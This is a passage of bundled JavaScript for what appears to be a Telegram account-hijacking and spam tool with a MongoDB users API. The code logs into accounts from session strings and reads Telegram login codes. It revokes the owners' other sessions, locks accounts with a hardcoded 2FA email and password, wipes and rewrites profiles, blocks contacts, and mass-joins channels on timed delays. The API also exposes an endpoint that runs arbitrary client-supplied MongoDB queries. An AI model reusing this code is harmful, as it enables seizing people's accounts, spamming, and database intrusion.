    __metadata("design:type", Number)
], User.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "ownVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "contacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({
        type: mongoose_2.default.Schema.Types.Mixed,
        default: {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: [],
            totalCalls: 0,
        },
    }),
    __metadata("design:type", Object)
], User.prototype, "calls", void 0);
exports.User = User = __decorate([
    (0, mongoose_1.Schema)({ collection: 'users', versionKey: false, autoIndex: true })
], User);
exports.UserSchema = mongoose_1.SchemaFactory.createForClass(User);


/***/ }),

/***/ "./nest/components/users/users.controller.ts":
/*!***************************************************!*\
  !*** ./nest/components/users/users.controller.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const users_service_1 = __webpack_require__(/*! ./users.service */ "./nest/components/users/users.service.ts");
const user_schema_1 = __webpack_require__(/*! ./schemas/user.schema */ "./nest/components/users/schemas/user.schema.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const search_user_dto_1 = __webpack_require__(/*! ./dto/search-user.dto */ "./nest/components/users/dto/search-user.dto.ts");
let UsersController = class UsersController {
    constructor(usersService) {
        this.usersService = usersService;
    }
    create(createUserDto) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.usersService.create(createUserDto);
        });
    }
    search(queryParams) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.usersService.search(queryParams);
        });
    }
    findAll() {
        return __awaiter(this, void 0, void 0, function* () {
            return this.usersService.findAll();
        });
    }
    findOne(tgId) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.usersService.findOne(tgId);
        });
    }
    update(tgId, updateUserDto) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.usersService.update(tgId, updateUserDto);
        });
    }
    remove(tgId) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.usersService.delete(tgId);
        });
    }
    executeQuery(query) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                return yield this.usersService.executeQuery(query);
            }
            catch (error) {
                throw error; // You might want to handle errors more gracefully
            }
        });
    }
};
exports.UsersController = UsersController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new user' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [user_schema_1.User]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('/search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search users based on various parameters' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_user_dto_1.SearchUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all users' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':tgId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete a user by tgId' }),
    (0, swagger_1.ApiParam)({ name: 'tgId', description: 'The Telegram ID of the user', type: String }),
    __param(0, (0, common_1.Param)('tgId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' })
    //@apiresponse({ status: 200, description: 'Query executed successfully.' })
    //@apiresponse({ status: 400, description: 'Invalid query.' })
    //@apiresponse({ status: 500, description: 'Internal server error.' })
    ,
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "executeQuery", null);
exports.UsersController = UsersController = __decorate([
    (0, swagger_1.ApiTags)('Telegram Users') // Tag to categorize all endpoints in this controller
    ,
    (0, common_1.Controller)('users'),
    __metadata("design:paramtypes", [users_service_1.UsersService])
], UsersController);


/***/ }),

/***/ "./nest/components/users/users.module.ts":
/*!***********************************************!*\
  !*** ./nest/components/users/users.module.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const users_service_1 = __webpack_require__(/*! ./users.service */ "./nest/components/users/users.service.ts");
const users_controller_1 = __webpack_require__(/*! ./users.controller */ "./nest/components/users/users.controller.ts");
const user_schema_1 = __webpack_require__(/*! ./schemas/user.schema */ "./nest/components/users/schemas/user.schema.ts");
let UsersModule = class UsersModule {
};
exports.UsersModule = UsersModule;
exports.UsersModule = UsersModule = __decorate([
    (0, common_1.Module)({
        imports: [mongoose_1.MongooseModule.forFeature([{ name: 'userModule', schema: user_schema_1.UserSchema, collection: 'users' }])],
        controllers: [users_controller_1.UsersController],
        providers: [users_service_1.UsersService],
        exports: [users_service_1.UsersService]
    })
], UsersModule);


/***/ }),

/***/ "./nest/components/users/users.service.ts":
/*!************************************************!*\
  !*** ./nest/components/users/users.service.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let UsersService = class UsersService {
    constructor(userModel) {
        this.userModel = userModel;
    }
    create(user) {
        return __awaiter(this, void 0, void 0, function* () {
            const newUser = new this.userModel(user);
            return newUser.save();
        });
    }
    findAll() {
        return __awaiter(this, void 0, void 0, function* () {
            return this.userModel.find().exec();
        });
    }
    findOne(tgId) {
        return __awaiter(this, void 0, void 0, function* () {
            const user = yield this.userModel.findOne({ tgId }).exec();
            if (!user) {
                throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
            }
            return user;
        });
    }
    update(tgId, user) {
        return __awaiter(this, void 0, void 0, function* () {
            delete user['_id'];
            const existingUser = yield this.userModel.findOneAndUpdate({ tgId }, { $set: user }, { new: true }).exec();
            if (!existingUser) {
                throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
            }
            return existingUser;
        });
    }
    delete(tgId) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.userModel.deleteOne({ tgId }).exec();
            if (result.deletedCount === 0) {
                throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
            }
        });
    }
    search(filter) {
        return __awaiter(this, void 0, void 0, function* () {
            if (filter.firstName) {
                filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
            }
            if (filter.twoFA !== undefined) {
                filter.twoFA = filter.twoFA === 'true' || filter.twoFA === '1' || filter.twoFA === true;
            }
            console.log(filter);
            return this.userModel.find(filter).exec();
        });
    }
    executeQuery(query) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                if (!query) {
                    throw new common_1.BadRequestException('Query is invalid.');
                }
                return yield this.userModel.find(query).exec();
            }
            catch (error) {
                throw new common_1.InternalServerErrorException(error.message);
            }
        });
    }
};
exports.UsersService = UsersService;
exports.UsersService = UsersService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('userModule')),
    __metadata("design:paramtypes", [mongoose_2.Model])
], UsersService);


/***/ }),

/***/ "./telegramManager.js":
/*!****************************!*\
  !*** ./telegramManager.js ***!
  \****************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   TelegramManager: () => (/* binding */ TelegramManager),
/* harmony export */   createClient: () => (/* binding */ createClient),
/* harmony export */   deleteClient: () => (/* binding */ deleteClient),
/* harmony export */   disconnectAll: () => (/* binding */ disconnectAll),
/* harmony export */   getClient: () => (/* binding */ getClient),
/* harmony export */   hasClient: () => (/* binding */ hasClient),
/* harmony export */   setActiveClientSetup: () => (/* binding */ setActiveClientSetup)
/* harmony export */ });
/* harmony import */ var telegram__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! telegram */ "telegram");
/* harmony import */ var telegram__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(telegram__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var telegram_events_index_js__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! telegram/events/index.js */ "telegram/events/index.js");
/* harmony import */ var telegram_events_index_js__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(telegram_events_index_js__WEBPACK_IMPORTED_MODULE_1__);
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! axios */ "axios");
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(axios__WEBPACK_IMPORTED_MODULE_2__);
/* harmony import */ var telegram_sessions__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
/* harmony import */ var telegram_sessions__WEBPACK_IMPORTED_MODULE_3___default = /*#__PURE__*/__webpack_require__.n(telegram_sessions__WEBPACK_IMPORTED_MODULE_3__);
/* harmony import */ var _mailreader__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./mailreader */ "./mailreader.js");
/* harmony import */ var telegram_client_uploads__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! telegram/client/uploads */ "telegram/client/uploads");
/* harmony import */ var telegram_client_uploads__WEBPACK_IMPORTED_MODULE_5___default = /*#__PURE__*/__webpack_require__.n(telegram_client_uploads__WEBPACK_IMPORTED_MODULE_5__);
/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./utils */ "./utils.js");
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! fs */ "fs");
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_7___default = /*#__PURE__*/__webpack_require__.n(fs__WEBPACK_IMPORTED_MODULE_7__);
/* harmony import */ var _dbservice__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! ./dbservice */ "./dbservice.js");










const clients = new Map();

let activeClientSetup = undefined
function getActiveClientSetup() {
    return activeClientSetup;
}

function setActiveClientSetup(data) {
    activeClientSetup = data
}

function getClient(number) {
    return clients.get(number);
}

function hasClient(number) {
    return clients.has(number);
}

async function deleteClient(number) {
    const cli = getClient(number);
    await cli?.disconnect();
    return clients.delete(number);
}

async function disconnectAll() {
    const data = clients.entries();
    console.log("Disconnecting All Clients");
    for (const [phoneNumber, client] of data) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        } catch (error) {
            console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(error))
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}


async function createClient(number, session, autoDisconnect = true, handler = true) {
    if (!clients.has(number)) {
        return new Promise(async (resolve) => {
            const cli = new TelegramManager(session, number);
            await cli.createClient(autoDisconnect);
            if (cli.expired) {
                clients.set(number, cli);
            }
            resolve(cli.expired);
        });
    } else {
        return { msgs: 10, total: 10 }
    }
}


class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new telegram_sessions__WEBPACK_IMPORTED_MODULE_3__.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.expired = false;
        this.channelArray = []
    }

    async disconnect() {
        await this.client.disconnect();
        await this.client.destroy();
        this.session.delete();
    }

    async getchatId(username) {
        const tt = await this.client.getInputEntity(username);
        console.log(tt)
        return tt
    }

    async createClient(autoDisconnect = true, handler = true) {
        try {
            this.client = new telegram__WEBPACK_IMPORTED_MODULE_0__.TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                connectionRetries: 5,
            });
            console.log("Stating Client - ", this.phoneNumber)
            await this.client.connect();
            // const msg = await this.client.sendMessage("777000", { message: "." });
            // await msg.delete({ revoke: true });
            if (autoDisconnect) {
                setTimeout(async () => {
                    if (this.client.connected || clients.get(this.phoneNumber)) {
                        console.log("SELF destroy client");
                        await this.client.disconnect();
                        await this.client.destroy();
                        this.session.delete();
                    } else {
                        console.log("Client Already Disconnected");
                    }
                    clients.delete(this.phoneNumber);
                }, 180000)
            } else {
                setInterval(async () => {
                    await this.client.connect();
                }, 20000);
            }
            let chats = { 'total': 0 };
            let myMsgs = { "total": 0 }
            if (handler) {
                this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new telegram_events_index_js__WEBPACK_IMPORTED_MODULE_1__.NewMessage());
                chats = await this.client?.getDialogs({ limit: 500 });
                myMsgs = await this.client.getMessages('me', { limit: 8 });
                console.log("TotalChats:", chats['total'])
            }
            this.expired = { msgs: myMsgs['total'], total: chats['total'] }
        } catch (error) {
            console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(error))
            this.expired = undefined;
        }
    }

    async getLastMsgs(limit) {
        const msgs = await this.client.getMessages("777000", { limit: parseInt(limit) });
        let resp = ''
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp = resp + msg.text + "\n"
        })
        return (resp)
    }

    async getSelfMSgsInfo() {
        const self = await this.client.getMe();
        const selfChatId = self.id;

        let photoCount = 0;
        let videoCount = 0;
        let movieCount = 0;

        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed
        for (const message of messageHistory) {
            if (message.photo) {
                photoCount++;
            } else if (message.video) {
                videoCount++;
            }
            const text = message.text.toLocaleLowerCase();
            if ((0,_utils__WEBPACK_IMPORTED_MODULE_6__.contains)(text, ['movie', 'series', '1080', '720', '640', 'title', 'aac', '265', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++
            }
        }

        return ({ photoCount, videoCount, movieCount })
    }
    async channelInfo(sendIds = false) {
        const chats = await this.client?.getDialogs({ limit: 600 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0
        this.channelArray.length = 0;
        console.log(chats["total"]);
        chats.map(async (chat) => {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = await chat.entity.toJSON();
                    const { broadcast, defaultBannedRights } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(chatEntity.username);
                    } else {
                        canSendFalseCount++;
                    }
                } catch (error) {
                    console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(error))
                }
            }
        });
        const responseObj = {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : []
        };
        return responseObj
    }

    async joinChannels(str) {
        const db = _dbservice__WEBPACK_IMPORTED_MODULE_8__.ChannelService.getInstance();
        const channels = str.split('|');
        console.log(this.phoneNumber, " - channelsLen - ", channels.length)
        for (let i = 0; i < channels.length; i++) {
            const channel = channels[i].trim();
            console.log(this.phoneNumber, "Trying: ", channel)
            try {
                let joinResult = await this.client.invoke(
                    new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.channels.JoinChannel({
                        channel: await this.client.getEntity(channel)
                    })
                );
                console.log(this.phoneNumber, " - Joined channel Sucesss - ", channel)
                try {
                    const chatEntity = await this.client.getEntity(channel)
                    const { title, id, broadcast, defaultBannedRights, participantsCount, megagroup, username } = chatEntity;
                    const entity = {
                        title,
                        id: id.toString(),
                        username,
                        megagroup,
                        participantsCount,
                        broadcast
                    };
                    if (!chatEntity.broadcast && !defaultBannedRights?.sendMessages) {
                        entity.canSendMsgs = true;
                        try {
                            await db.updateActiveChannel(entity.id.toString(), entity);
                            console.log("updated ActiveChannels");
                        } catch (error) {
                            console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(error))
                            console.log("Failed to update ActiveChannels");
                        }
                    } else {
                        await db.removeOnefromActiveChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                        await db.removeOnefromChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                        console.log("Removed Cahnnel- ", channel)
                    }
                } catch (error) {
                    console.log(this.phoneNumber, " - Failed - ", error)
                }
            } catch (error) {
                console.log("Channels ERR: ", error);
                if (error.toString().includes("No user has") || error.toString().includes("USERNAME_INVALID")) {
                    await db.removeOnefromActiveChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                    await db.removeOnefromChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                    console.log("Removed Cahnnel- ", channel)
                }
            }
            console.log(this.phoneNumber, " - On waiting period")
            await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
            console.log(this.phoneNumber, " - Will Try next")
        }
        console.log(this.phoneNumber, " - finished joining channels")
        await this.client.disconnect();
        await deleteClient(this.phoneNumber);
    }
    async removeOtherAuths() {
        const result = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.GetAuthorizations({}));
        const updatedAuthorizations = result.authorizations.map((auth) => {
            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
                || auth.deviceModel.toLowerCase().includes('windows')) {
                return auth;
            } else {
                this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.ResetAuthorization({ hash: auth.hash }));
                return null;
            }
        }).filter(Boolean);
        console.log(updatedAuthorizations);
    }

    async getAuths() {
        const result = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.GetAuthorizations({}));
        return result
    }

    async hasPassword() {
        const passwordInfo = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.GetPassword());
        return passwordInfo.hasPassword
    }

    async blockAllUsers() {
        const chats = await this.client?.getDialogs({ limit: 600 });
        for (let chat of chats) {
            if (chat.isUser) {
                await this.blockAUser(chat.id)
            }
            (0,_utils__WEBPACK_IMPORTED_MODULE_6__.sleep)(5000);
        }
    }

    async blockAUser(id) {
        const result = await this.client.invoke(
            new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.contacts.Block({
                id: id,
            })
        );
    }

    async getLastActiveTime() {
        const result = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.GetAuthorizations({}));
        let latest = 0
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore')) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        })
        return latest
    }

    async getMe() {
        const me = await this.client.getMe();
        return me
    }

    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.photos.GetUserPhotos({
                    userId: "me"
                })
            );
            console.log(result)
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(
                    new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.photos.DeletePhotos({
                        id: result.photos
                    }))
            }
            console.log("Deleted profile Photos");
        } catch (error) {
            console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(error))
        }
    }

    async set2fa() {
        (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.connectToMail)()
        const intervalParentId = setInterval(async () => {
            const isReady = (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.isMailReady)();
            if (isReady) {
                clearInterval(intervalParentId);
                await this.client.updateTwoFaSettings({
                    isCheckPassword: false,
                    email: "storeslaksmi@gmail.com",
                    hint: "password - India143",
                    newPassword: "Ajtdmwajt1@",
                    emailCodeCallback: async (length) => {
                        console.log("code sent");
                        return new Promise(async (resolve) => {
                            let retry = 0
                            const intervalId = setInterval(async () => {
                                console.log("checking code");
                                retry++
                                const isReady = (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.isMailReady)();
                                if (isReady && retry < 4) {
                                    const code = await (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.getcode)();
                                    if (code !== '') {
                                        clearInterval(intervalId);
                                        (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.disconnectfromMail)()
                                        resolve(code);
                                    }
                                } else {
                                    clearInterval(intervalId);
                                    await this.client.disconnect();
                                    await deleteClient(this.phoneNumber);
                                    (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.disconnectfromMail)()
                                    resolve(code);
                                }
                            }, 6000);
                        });
                    },
                    onEmailCodeError: (e) => { console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(e)); return Promise.resolve("error") }
                })
            }
        }, 5000);
    }

    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyPhoneCall({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyProfilePhoto({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyPhoneNumber({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyStatusTimestamp({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );

            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyAbout({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
        }
        catch (e) {
            console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(e))
        }
    }
    async updateProfile(firstName, about) {
        try {
            const result = await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.UpdateProfile({
                    firstName: firstName,
                    lastName: "",
                    about: about,
                })
            );
            console.log("Updated NAme: ", firstName);
        } catch (error) {
            console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(error))
        }
    }
    async updateUsername(baseUsername) {
        let newUserName = ''
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                const res = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            } catch (error) {
                console.log((0,_utils__WEBPACK_IMPORTED_MODULE_6__.parseError)(error))
            }
        } else {
            while (true) {
                try {
                    const result = await this.client.invoke(
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.CheckUsername({ username })
                    );
                    console.log(result, " - ", username)
                    if (result) {
                        const res = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username
                        break;
                    } else {
                        username = baseUsername + increment;
                        increment++;
                        await (0,_utils__WEBPACK_IMPORTED_MODULE_6__.sleep)(4000);
                    }
                } catch (error) {
                    console.log(error.message)
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                }
            }
        }
        return newUserName;
    }

    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new telegram_client_uploads__WEBPACK_IMPORTED_MODULE_5__.CustomFile(
                    'pic.jpg',
                    fs__WEBPACK_IMPORTED_MODULE_7___default().statSync(
                        image
                    ).size,
                    image
                ),
                workers: 1,
            });
            console.log("file uploaded- ", file)
            await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated")
        } catch (error) {
